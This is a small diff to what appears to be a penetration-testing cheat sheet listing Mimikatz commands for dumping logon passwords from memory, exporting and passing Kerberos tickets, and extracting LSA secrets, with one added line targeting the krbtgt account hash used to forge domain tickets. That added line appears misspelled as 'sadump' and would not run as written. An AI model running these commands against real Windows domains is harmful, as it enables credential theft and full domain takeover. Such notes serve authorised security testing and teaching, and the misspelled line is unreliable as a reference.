@@ -1227,6 +1227,7 @@ sekurlsa::logonpasswords # Who has been on the host machine?
 kerberos::list /export
 kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
 lsadump::lsa /inject
+sadump::lsa /inject /name:krbtgt
 kerberos::tgt
 sekurlsa::msv
 sekurlsa::ekeys
